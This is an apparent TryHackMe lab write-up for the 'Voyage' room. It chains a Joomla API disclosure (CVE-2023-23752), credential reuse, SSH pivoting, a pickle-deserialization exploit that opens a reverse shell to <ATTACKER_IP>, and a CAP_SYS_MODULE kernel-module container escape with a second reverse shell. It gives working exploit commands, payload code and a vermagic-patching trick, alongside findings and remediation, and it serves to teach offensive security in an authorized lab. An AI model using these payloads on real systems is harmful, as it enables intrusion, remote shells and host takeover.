# TryHackMe — Voyage

**Difficulty:** Medium
**Category:** Web · Container Pivot · Container Escape
**Platform:** [TryHackMe](https://tryhackme.com/)

> A CMS information-disclosure CVE leads to a leaked credential that is reused across three trust
> boundaries. From there the path runs through a Docker network via an SSH tunnel into a second
> container, where an insecure `pickle` deserialization gives RCE. The final host escape abuses an
> over-privileged container (`CAP_SYS_MODULE`) by loading a malicious kernel module — with a
> vermagic-patch trick to bypass a kernel-version mismatch.

---

## Table of Contents

1. [Summary](#summary)
2. [Attack Chain at a Glance](#attack-chain-at-a-glance)
3. [Enumeration](#1-enumeration)
4. [Joomla API Information Disclosure (CVE-2023-23752)](#2-joomla-api-information-disclosure-cve-2023-23752)
5. [Credential Reuse & SSH Pivot](#3-credential-reuse--ssh-pivot)
6. [Reaching the Internal Flask App (SSH Tunnel)](#4-reaching-the-internal-flask-app-ssh-tunnel)
7. [Insecure Pickle Deserialization → RCE (User Flag)](#5-insecure-pickle-deserialization--rce-user-flag)
8. [Container Escape via CAP_SYS_MODULE (Root Flag)](#6-container-escape-via-cap_sys_module-root-flag)
9. [Findings Summary](#findings-summary)
10. [Remediation](#remediation)
11. [Lessons Learned](#lessons-learned)

---

## Summary

| Item | Value |
|------|-------|
| User flag | `THM{ee34xxxxxxxxxxxxxxxxxxxxxxxxxxxx1902}` |
| Root flag | `THM{ace9xxxxxxxxxxxxxxxxxxxxxxxxxxxxceff}` |
| Key CVE | CVE-2023-23752 (Joomla Web Services improper access control) |
| Key techniques | Credential reuse, SSH local port forwarding, Python `pickle` deserialization RCE, `CAP_SYS_MODULE` kernel-module container escape |
| MITRE ATT&CK | T1190 (Exploit Public-Facing App), T1552 (Unsecured Credentials), T1210 (Exploit Remote Services), T1611 (Escape to Host) |

The environment is a host running Joomla plus **two Docker containers** on an internal bridge network.
The public surface is only the entry point; the real work happens inside the container network.

---

## Attack Chain at a Glance

```
Joomla 4.2.7 (:80)
  └─ CVE-2023-23752 : /api/...?public=true → DB credentials leak      (WSTG-ATHZ-02 / CONF-05)
     └─ Credential reuse ×3 : MySQL + container-1 SSH + Flask panel     (T1552)
        └─ SSH local-forward :5000 through container-1 (pivot)          (T1210)
           └─ session_data = hex(pickle) → insecure deserialization RCE (WSTG-INPV-11 / CWE-502)
              └─ CAP_SYS_MODULE on container-2 → LKM + call_usermodehelper → host escape (T1611 / CWE-250)
                 └─ root on the host
```

**Topology**

```
[ Attacker ]
     │ ssh -p2222
     ▼
[ Container-1  192.168.100.10 ]   Joomla + SSH:2222   (pivot box)
     │ reaches internal net
     ▼
[ Container-2  192.168.100.12 ]   Flask "Secret Finance Panel" :5000   (RCE here → user flag)
     │ CAP_SYS_MODULE → load kernel module into shared host kernel
     ▼
[ Host  192.168.100.1 ]   AWS instance   (root flag)
```

---

## 1. Enumeration

### 1.1 Nmap

```bash
nmap -sCV -O -p- -Pn <TARGET_IP>
```

Key results:

```
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu 24.x)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu 20.04)
```

**Observation (important):** two SSH services on different ports running **different Ubuntu
releases** (24.x on `:22`, 20.04 on `:2222`). Different OS versions on "one machine" is a strong
tell for a **host + container** setup — `:2222` is a forwarded container port. Keep this in mind;
it defines the whole room shape.

The HTTP service is **Joomla** (from `http-generator` and `robots.txt`). The `robots.txt` output
exposes standard Joomla paths — including `/api/`, which is the single most important detail:

```
/administrator/  /api/  /bin/  /cache/  /cli/  /components/  /includes/  ...
```

### 1.2 Add vhost & confirm CMS

```bash
echo "<TARGET_IP>   voyage.thm" | sudo tee -a /etc/hosts
curl -I http://voyage.thm
```

### 1.3 Confirm Joomla version

```bash
curl -s http://voyage.thm/administrator/manifests/files/joomla.xml
```

```xml
<version>4.2.7</version>
```

**Joomla 4.2.7** is the top of the vulnerable range for **CVE-2023-23752** (affects 4.0.0–4.2.7,
fixed in 4.2.8). Combined with an exposed `/api/`, this is a textbook match.

---

## 2. Joomla API Information Disclosure (CVE-2023-23752)

### 2.1 The vulnerability (mechanism)

Joomla's Web Services API endpoints such as `config/application` and `users` are privileged — they
should require a Bearer API token with `core.admin` rights and return `401` otherwise.

CVE-2023-23752 is a flaw in the **order of checks**: the `?public=true` parameter classifies the
request as *public* **before** the full ACL check runs. The router serves the resource and the
authorization check is never reached. This is *authorization-before-authentication ordering* —
mapped to **WSTG-ATHZ-02** (authorization bypass) and **WSTG-CONF-05** (infrastructure config
disclosure).

### 2.2 Leak the configuration

```bash
curl -s "http://voyage.thm/api/index.php/v1/config/application?public=true" | jq
```

Relevant leaked attributes:

```json
{ "user": "root" }
{ "password": "Root************" }     # DB password — redacted
{ "db": "joomla_db" }
{ "dbprefix": "ecsjh_" }
{ "host": "localhost" }
```

### 2.3 Leak the user list

```bash
curl -s "http://voyage.thm/api/index.php/v1/users?public=true" | jq
```

```json
{
  "name": "root",
  "username": "root",
  "email": "mail@tourism.thm",
  "group_names": "Super Users"
}
```

We now hold a **plaintext DB credential** (`root` / `Root************`) and the identity of the sole
Super User.

> **Two separate findings here:** (a) the Web Services API is exposed at all — disabled by default in
> a stock install (misconfiguration), and (b) the CVE that bypasses its access control.

---

## 3. Credential Reuse & SSH Pivot

The leaked value is a **MySQL** password — not necessarily valid elsewhere. Test reuse first
(cheap, high-value):

1. **Joomla admin** (`/administrator`, user `root`) → **failed**.
2. **SSH on `:2222`** (the container) → **success**.
3. SSH on `:22` (the host) → not needed.

```bash
ssh root@voyage.thm -p2222
# password: Root************   (reused from the DB config)
```

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.8.0-1031-aws x86_64)
root@f5eb774507f2:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Confirming we are in a container, not the host:**

- Hostname `f5eb774507f2` — a 12-hex-char auto-generated Docker container ID.
- Ubuntu 20.04 userland but kernel `6.8.0-1031-aws` — a container **shares the host kernel**, so
  this kernel version is really the *host's*.

### 3.1 Is this container an escape point? (No — it's a pivot box)

```bash
capsh --print                          # default Docker caps only — no cap_sys_module/sys_admin
ls -la /var/run/docker.sock            # absent
mount ; cat /proc/1/cgroup             # overlay only, no host mounts
ls -la /dev                            # minimal: null/zero/random/tty — no block devices
env                                    # no secrets
cat /root/.bash_history
```

`.bash_history` breadcrumbs:

```
ls
curl
nmap
socat
exit
```

`nmap` and `socat` are pre-installed and referenced — an intentional hint: **this box is for
pivoting into the internal network**, not for escaping.

### 3.2 Map the internal Docker network

```bash
ip a ; hostname -I
# eth0: 192.168.100.10/24   MAC 02:42:... (Docker bridge prefix)

nmap -sn 192.168.100.0/24
```

```
192.168.100.1    → host (gateway, AWS us-west-2 internal DNS)
192.168.100.10   → this container
192.168.100.12   → voyage_priv2   ← new target
```

```bash
nmap -sCV -p- 192.168.100.12
```

```
5000/tcp open  http  Werkzeug/3.1.3 Python/3.10.12
Title: "Tourism Secret Finance Panel"   (Login "Under Dev")
```

A **Flask** app reachable only from inside the Docker network.

---

## 4. Reaching the Internal Flask App (SSH Tunnel)

Container-1 can see `192.168.100.0/24`; the attacker cannot. Use container-1 as a proxy via **SSH
local port forwarding**:

```bash
ssh -L 5000:192.168.100.12:5000 root@voyage.thm -p2222
```

Flag breakdown:

- `5000` (first) → port opened on **attacker's** localhost (entry point).
- `192.168.100.12:5000` → destination **as seen from the SSH server** (container-1).
- `root@voyage.thm -p2222` → the transport (SSH into container-1).

Now `http://localhost:5000` on the attacker maps to the internal panel:

```bash
curl -s http://localhost:5000 | head
```

### 4.1 Enumerate the app

```bash
curl -s http://localhost:5000/console        # Werkzeug debugger present (debug=True) but PIN-locked
ffuf -u http://localhost:5000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

`ffuf` finds only `/console`. No hidden routes ⇒ the vulnerability is in **application logic**, not a
forgotten endpoint. The Werkzeug debugger is PIN-locked and ultimately unnecessary.

---

## 5. Insecure Pickle Deserialization → RCE (User Flag)

### 5.1 Log in and inspect the cookie

The same reused credential works on the panel login (`root` / `Root************`). Capture headers:

```bash
curl -si -X POST http://localhost:5000 -d "username=root&password=Root************"
```

```
Set-Cookie: session_data=8004952500...7d94288c04757365...94752e; Path=/
```

The cookie value is **hex**, and it begins with `80 04` — the magic bytes of **Python `pickle`
protocol 4**. Decode it:

```bash
echo "8004...752e" | xxd -r -p | xxd
# reveals: user, root, revenue, 85000  →  {'user':'root','revenue':'85000'}
```

This is **not** a signed Flask session — there is no HMAC. The developer replaced the signed session
with a custom `session_data` cookie that is fed straight into `pickle.loads()`.

### 5.2 Confirm from source (post-exploitation `app.py`)

```python
data = pickle.loads(bytes.fromhex(session_cookie))   # ← raw pickle on client-controlled input
...
app.run(host='0.0.0.0', port=5000, debug=True)        # ← explains /console
```

`pickle` is not a data format — it is a **stream of VM opcodes** executed on deserialization. The
`__reduce__` method lets us make `pickle.loads()` call an arbitrary callable. This is **Insecure
Deserialization** (WSTG-INPV-11, OWASP A08, CWE-502).

### 5.3 Build the payload

```python
# script.py
import pickle, os

class RCE:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())
print(payload.hex())
```

```bash
python3 script.py        # prints the hex payload
```

### 5.4 Fire

```bash
# terminal 1 (attacker) — start listener FIRST:
nc -nvlp 4444

# terminal 2 — deliver the crafted cookie through the tunnel:
curl -s http://localhost:5000 -H "Cookie: session_data=<HEX_PAYLOAD>"
```

```
Connection received on <HOST_IP>
root@d221f7bc7bf8:/finance-app# id
uid=0(root) gid=0(root) groups=0(root)
```

> Note: the reverse-shell connect-back arrives from the **host's external IP** — the container NATs
> outbound traffic through the host, so outbound reverse shells work fine.

### 5.5 User flag

```bash
find / -name 'user.txt' 2>/dev/null
cat /root/user.txt
```

```
THM{ee34xxxxxxxxxxxxxxxxxxxxxxxxxxxx1902}
```

---

## 6. Container Escape via CAP_SYS_MODULE (Root Flag)

### 6.1 Spot the intended path

```bash
ls -la /finance-app
```

```
.Module.symvers.cmd
.revshell.ko.cmd
.revshell.mod.o.cmd
.hello.c.swp
...
```

These are **Linux kernel-module (Kbuild) build artifacts** — a module named `revshell` was built
here. That is the designer's signpost.

### 6.2 Confirm the capability

```bash
cat /proc/self/status | grep Cap
# CapEff: 00000000a80525fb
capsh --decode=00000000a80525fb        # includes cap_sys_module (bit 16) + cap_sys_admin
```

The container is **over-privileged** (started with `--privileged` or `--cap-add=SYS_MODULE`).

> **This is not a CVE.** `CAP_SYS_MODULE` behaves exactly as designed — "load code into the kernel."
> The flaw is the **decision** to grant it. Report it as *Container Escape via CAP_SYS_MODULE
> (misconfiguration)* — **MITRE T1611**, **CWE-250 / CWE-269**. Remediation is dropping the
> capability, not a patch.

**Why it escapes:** containers share the host kernel. A module loaded with `insmod` inside the
container runs in **ring 0 of the host kernel**, and `call_usermodehelper()` spawns a process in the
**host namespace as root**.

### 6.3 The kernel-version problem

```bash
uname -r                                # 6.8.0-1031-aws   (running host kernel)
ls /lib/modules/6.8.0-1031-aws/build    # NO BUILD DIR
ls -la /usr/src/                         # headers for 6.8.0-1029 and 6.8.0-1030 ONLY
which make gcc                           # both present
```

Headers exist only for the **neighbouring** revisions (`-1029`, `-1030`), not the running `-1031`.
`insmod` rejects a module built for the wrong version via **vermagic**
(`Invalid module format`; dmesg: `version magic ... should be ...`).

**The trick:** adjacent point revisions share ABI, so build under `-1030` and then **patch the
vermagic string** in the finished `.ko`. The two version strings are the **same length** (14 chars),
so byte offsets don't shift.

### 6.4 Write the module

```bash
mkdir -p /tmp/b && cd /tmp/b
cat > revshell.c << 'EOF'
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kmod.h>
MODULE_LICENSE("GPL");

static int __init revshell_init(void) {
    char *argv[] = {
        "/bin/bash", "-c",
        "bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1",
        NULL
    };
    char *envp[] = { "PATH=/bin:/sbin:/usr/bin:/usr/sbin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}
static void __exit revshell_exit(void) {}
module_init(revshell_init);
module_exit(revshell_exit);
EOF
```

### 6.5 Makefile (build under an available revision)

`KVER` only **selects** among installed header trees — it does not synthesize a missing one.

```bash
printf 'obj-m += revshell.o\nKVER := 6.8.0-1030-aws\nKDIR := /lib/modules/$(KVER)/build\nall:\n\tmake -C $(KDIR) M=$(PWD) modules\n' > Makefile
cat -A Makefile                 # verify the recipe line starts with a TAB (^I), not spaces
```

### 6.6 Build

```bash
make
ls -la revshell.ko
```

`compiler differs` and `Skipping BTF (no vmlinux)` warnings are harmless.

### 6.7 Patch vermagic (1030 → 1031)

```bash
modinfo revshell.ko | grep vermagic          # 6.8.0-1030-aws ...
sed -i 's/6.8.0-1030-aws/6.8.0-1031-aws/g' revshell.ko
strings revshell.ko | grep 6.8.0             # now 6.8.0-1031-aws
```

### 6.8 Load it and catch the host root shell

```bash
# attacker, new terminal:
nc -nvlp 5555

# inside container-2:
insmod /tmp/b/revshell.ko
```

> Fallback if CRC/modversions still disagree: `insmod -f /tmp/b/revshell.ko` (force).

```
Connection received on <HOST_IP>
root@ip-<HOST>:/# id
uid=0(root) gid=0(root) groups=0(root)
root@ip-<HOST>:/# hostname       # host, not a container ID
```

### 6.9 Root flag

```bash
cat /root/root.txt
```

```
THM{ace9xxxxxxxxxxxxxxxxxxxxxxxxxxxxceff}
```

---

## Findings Summary

| # | Finding | Class | Reference |
|---|---------|-------|-----------|
| 1 | Joomla Web Services API exposed to the internet | Misconfiguration | WSTG-CONF-05 |
| 2 | Unauthenticated config/user disclosure via `?public=true` | Code vulnerability (CVE) | CVE-2023-23752 · WSTG-ATHZ-02 |
| 3 | Plaintext DB credential reused across MySQL, SSH, and web login | Credential reuse | T1552 · CWE-522 |
| 4 | Flask `debug=True` in production (Werkzeug console exposed) | Misconfiguration | WSTG-CONF-02 |
| 5 | Custom session cookie deserialized with raw `pickle.loads()` | Code vulnerability (class-level) | WSTG-INPV-11 · CWE-502 |
| 6 | Container granted `CAP_SYS_MODULE` (host escape) | Misconfiguration / abuse | T1611 · CWE-250 · CWE-269 |

Three *distinct* classes of finding in one chain: a real code CVE, a class-level code flaw with no
CVE, and pure misconfiguration — a useful reminder that real chains are rarely 0-day.

---

## Remediation

- **Joomla:** upgrade to ≥ 4.2.8; disable the Web Services API unless required; never expose `/api/`
  publicly without authentication.
- **Credentials:** unique secrets per service; never reuse a DB password for OS/web logins; store
  secrets outside world-readable config where possible.
- **Flask:** never run with `debug=True` in production; never deserialize client-controlled data with
  `pickle` — use signed sessions or a safe format (JSON) with server-side validation.
- **Containers:** drop unnecessary capabilities (`--cap-drop=ALL`, add back only what's needed);
  never grant `CAP_SYS_MODULE`/`CAP_SYS_ADMIN` or `--privileged`; do not mount `docker.sock` into
  containers; segment internal Docker networks.

---

## Lessons Learned

- Every hop was a **reused secret or an over-granted privilege**, never a novel exploit. Chains are
  built from accumulated small concessions.
- **Read the artifacts.** `.bash_history` and the `.revshell.*.cmd` files named the intended path
  (pivot, then kernel module) before any exploitation.
- **Understand the cookie before firing payloads.** Decoding `session_data` (pickle magic `80 04`)
  revealed the vulnerability class directly and made the `/console` PIN path unnecessary.
- **Vermagic patching** (`sed` on an equal-length version string, built against an adjacent header
  revision) is a reusable technique when you have near-miss kernel headers but not the exact version.
- Escape vectors are a **function of what is misconfigured** — `docker.sock`, privileged block
  devices, and `CAP_SYS_MODULE` are different keys; the room hands you exactly one.

---

*Educational write-up from an authorized TryHackMe lab. All credentials and flags are partially
redacted.*
